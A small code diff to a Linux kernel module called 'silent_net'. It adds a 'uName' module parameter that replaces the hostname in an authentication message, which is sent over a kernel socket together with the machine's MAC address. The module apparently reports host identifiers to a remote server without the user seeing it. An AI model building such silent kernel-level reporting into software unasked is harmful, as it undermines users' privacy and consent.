@@ -1,13 +1,16 @@
 /*
  *	'silent_net' data transmission
  *
- * 	Handles data transmission to destination ip
- *	Message failure result in backup to a circular buffer file
  *
  *	Omer Kfir (C)
  */
 
 #include "transmission.h"
+
+char *uName = "\x00";
+
+module_param(uName, charp, 0644);
+MODULE_PARM_DESC(uName, "Name of user");
 
 static struct socket *sock;    // Struct socket
 static bool connected = false; // Boolean which indicates if currently connected
@@ -96,8 +99,11 @@ void handle_credentials(void) {
   char mac_buf[MAC_SIZE];
   get_mac_address(mac_buf);
 
+  if ((int)strlen(uName) == 0)
+	uName = utsname()->nodename;
+
   protocol_format(cred, "%s" PROTOCOL_SEPARATOR "%s" PROTOCOL_SEPARATOR "%s",
-                  MSG_AUTH, mac_buf, utsname()->nodename);
+                  MSG_AUTH, mac_buf, uName);
 }
 
 /* Initialize all transmission objects */
